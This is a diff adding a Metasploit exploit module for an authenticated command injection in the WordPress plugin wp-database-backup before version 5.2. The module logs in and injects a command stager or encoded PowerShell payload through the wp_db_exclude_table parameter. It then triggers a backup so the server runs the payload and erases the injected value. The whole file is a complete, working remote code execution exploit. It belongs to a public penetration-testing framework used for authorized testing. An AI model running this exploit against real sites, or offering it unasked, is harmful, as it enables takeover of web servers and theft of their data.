@@ -1,0 +1,194 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::CmdStager
+  include Msf::Exploit::Powershell
+  include Msf::Exploit::Remote::HTTP::Wordpress
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'WP Database Backup RCE',
+      'Description'    => %q(
+        There exists a command injection vulnerability in the Wordpress plugin
+        `wp-database-backup` for versions < 5.2.
+
+        For the backup functionality, the plugin generates a `mysqldump` command
+        to execute. The user can choose specific tables to exclude from the backup
+        by setting the `wp_db_exclude_table` parameter in a POST request to the
+        `wp-database-backup` page. The names of the excluded tables are included in
+        the `mysqldump` command unsanitized. Arbitrary commands injected through the
+        `wp_db_exclude_table` parameter are executed each time the functionality
+        for creating a new database backup are run.
+
+        Authentication is required to successfully exploit this vulnerability.
+      ),
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+      [
+        'Mikey Veenstra / Wordfence',  # Vulnerability Discovery
+        'Shelby Pace'                  # Metasploit module
+      ],
+      'References'     =>
+        [
+          [ 'URL', 'https://www.wordfence.com/blog/2019/05/os-command-injection-vulnerability-patched-in-wp-database-backup-plugin/' ],
+        ],
+      'Platform'       => [ 'win', 'linux' ],
+      'Arch'           => [ ARCH_X86, ARCH_X64 ],
+      'Targets'        =>
+        [
+          [
+            'Windows',
+            {
+              'Platform'        => 'win',
+              'Arch'            => [ ARCH_X86, ARCH_X64 ]
+            }
+          ],
+          [
+            'Linux',
+            {
+              'Platform'        =>  'linux',
+              'Arch'            =>  [ ARCH_X86, ARCH_X64 ],
+              'CmdStagerFlavor' =>  'printf'
+            }
+          ]
+        ],
+      'DisclosureDate' => '2019-04-24',
+      'DefaultTarget'  => 0
+    ))
+
+    register_options(
+    [
+      OptString.new('USERNAME', [ true, 'Wordpress username', '' ]),
+      OptString.new('PASSWORD', [ true, 'Wordpress password', '' ]),
+      OptString.new('TARGETURI', [ true, 'Base path to Wordpress installation', '/' ])
+    ])
+  end
+
+  def check
+    return CheckCode::Unknown unless wordpress_and_online?
+
+    changelog_uri = normalize_uri(target_uri.path, 'wp-content', 'plugins', 'wp-database-backup', 'readme.txt')
+    res = send_request_cgi(
+      'method'  =>  'GET',
+      'uri'     =>  changelog_uri
+    )
+
+    if res && res.code == 200
+      version = res.body.match(/=+\s(\d+\.\d+)\.?\d*\s=/)
+      return CheckCode::Detected unless version && version.length > 1
+
+      vprint_status("Version of wp-database-backup detected: #{version[1]}")
+      return CheckCode::Appears if Gem::Version.new(version[1]) < Gem::Version.new('5.2')
+    end
+    CheckCode::Safe
+  end
+
+  def exploit
+    cookie = wordpress_login(datastore['USERNAME'], datastore['PASSWORD'])
+    fail_with(Failure::NoAccess, 'Unable to log into Wordpress') unless cookie
+
+    res = create_exclude_table(cookie)
+    nonce = get_nonce(res)
+    create_backup(cookie, nonce)
+
+    clear_exclude_table(cookie)
+  end
+
+  def create_exclude_table(cookie)
+    @exclude_uri = normalize_uri(target_uri.path, 'wp-admin', 'tools.php')
+    res = send_request_cgi(
+      'method'    =>  'GET',
+      'uri'       =>  @exclude_uri,
+      'cookie'    =>  cookie,
+      'vars_get'  =>  { 'page'  =>  'wp-database-backup' }
+    )
+
+    fail_with(Failure::NotFound, 'Unable to reach the wp-database-backup settings page') unless res && res.code == 200
+    print_good('Reached the wp-database-backup settings page')
+    if datastore['TARGET'] == 1
+      comm_payload = generate_cmdstager(concat_operator: ' && ', temp: './')
+      comm_payload = comm_payload.join('&&')
+      comm_payload = comm_payload.gsub('\'', '')
+      comm_payload = "; #{comm_payload} ;"
+    else
+      comm_payload = " & #{cmd_psh_payload(payload.encoded, payload.arch, remove_comspec: true, encode_final_payload: true)} & ::"
+    end
+
+    table_res = send_request_cgi(
+      'method'    =>  'POST',
+      'uri'       =>  @exclude_uri,
+      'cookie'    =>  cookie,
+      'vars_post' =>
+      {
+        'wpsetting'                       =>  'Save',
+        'wp_db_exclude_table[wp_comment]' =>  comm_payload
+      }
+    )
+
+    fail_with(Failure::UnexpectedReply, 'Failed to submit payload as an excluded table') unless table_res && table_res.code
+    print_good('Successfully added payload as an excluded table')
+
+    res.get_html_document
+  end
+
+  def get_nonce(response)
+    fail_with(Failure::UnexpectedReply, 'Failed to get a proper response') unless response
+
+    div_res = response.at('p[@class="submit"]')
+    fail_with(Failure::NotFound, 'Failed to find the element containing the nonce') unless div_res
+
+    wpnonce = div_res.to_s.match(/_wpnonce=([0-9a-z]*)/)
+    fail_with(Failure::NotFound, 'Failed to retrieve the wpnonce') unless wpnonce && wpnonce.length > 1
+
+    wpnonce[1]
+  end
+
+  def create_backup(cookie, nonce)
+    first_res = send_request_cgi(
+      'method'    =>  'GET',
+      'uri'       =>  @exclude_uri,
+      'cookie'    =>  cookie,
+      'vars_get'  =>
+      {
+        'page'      =>  'wp-database-backup',
+        '_wpnonce'  =>  nonce,
+        'action'    =>  'createdbbackup'
+      }
+    )
+
+    res = send_request_cgi(
+      'method'    =>  'GET',
+      'uri'       =>  @exclude_uri,
+      'cookie'    =>  cookie,
+      'vars_get'  =>
+      {
+        'page'          =>  'wp-database-backup',
+        'notification'  =>  'create'
+      }
+    )
+
+    fail_with(Failure::UnexpectedReply, 'Failed to create database backup') unless res && res.code == 200 && res.body.include?('Database Backup Created Successfully')
+    print_good('Successfully created a backup of the database')
+  end
+
+  def clear_exclude_table(cookie)
+    res = send_request_cgi(
+      'method'    =>  'POST',
+      'uri'       =>  @exclude_uri,
+      'cookie'    =>  cookie,
+      'vars_post' =>
+      {
+        'wpsetting'                       =>  'Save',
+        'wp_db_exclude_table[wp_comment]' =>  'wp_comment'
+      }
+    )
+
+   fail_with(Failure::UnexpectedReply, 'Failed to delete the remove the payload from the excluded tables') unless res && res.code == 200
+   print_good('Successfully deleted the payload from the excluded tables list')
+  end
+end
